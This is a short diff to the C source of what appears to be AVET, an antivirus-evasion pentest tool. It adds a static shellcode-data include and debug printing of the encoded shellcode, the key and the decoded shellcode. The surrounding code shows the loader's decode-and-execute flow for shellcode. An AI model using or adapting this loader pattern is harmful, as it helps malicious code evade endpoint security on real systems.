@@ -29,6 +29,10 @@ Web: https://github.com/govolution/avet
 
 #include <stdio.h>
 
+// Include static data (imported C arrays)
+// Defines for static retrieval are set in this file
+#include "static_data/static_data.include"
+
 // Include debug_print macro, if set.
 #include "debug_print/debug_print.include"
 #include "implementations/debug_print/debug_print.h"
@@ -94,6 +98,10 @@ int main (int argc, char **argv)
 	#endif
 	if(encoded_shellcode != NULL) {
 		DEBUG_PRINT(("Retrieved shellcode data, size is %d bytes.\n", shellcode_size));
+		for(int i = 0; i < shellcode_size; i++) {
+			DEBUG_PRINT(("%02x ", encoded_shellcode[i]));
+		}
+		DEBUG_PRINT(("\n\n"));
 	} else {
 		DEBUG_PRINT(("No shellcode retrieved.\n"));
 	}
@@ -108,6 +116,10 @@ int main (int argc, char **argv)
 	#endif
 	if(key != NULL) {
 		DEBUG_PRINT(("Retrieved key data, key length is %d bytes.\n", key_length));
+		for(int i = 0; i < key_length; i++) {
+			DEBUG_PRINT(("%02x ", key[i]));
+		}
+		DEBUG_PRINT(("\n\n"));
 	} else {
 		DEBUG_PRINT(("No key retrieved.\n"));
 	}
@@ -116,7 +128,12 @@ int main (int argc, char **argv)
 	unsigned char* shellcode = (unsigned char *) malloc(shellcode_size);
 	DEBUG_PRINT(("Calling decode_shellcode...\n"));
 	decode_shellcode(encoded_shellcode, shellcode_size, key, key_length, shellcode);
-		
+	DEBUG_PRINT(("Decoded shellcode: \n"));	
+	for(int i = 0; i < shellcode_size; i++) {
+		DEBUG_PRINT(("%02x ", shellcode[i]));
+	}
+	DEBUG_PRINT(("\n\n"));
+	
 	// Bind and execute shellcode
 	DEBUG_PRINT(("Calling shellcode_binder...\n"));
 	shellcode_binder(shellcode);
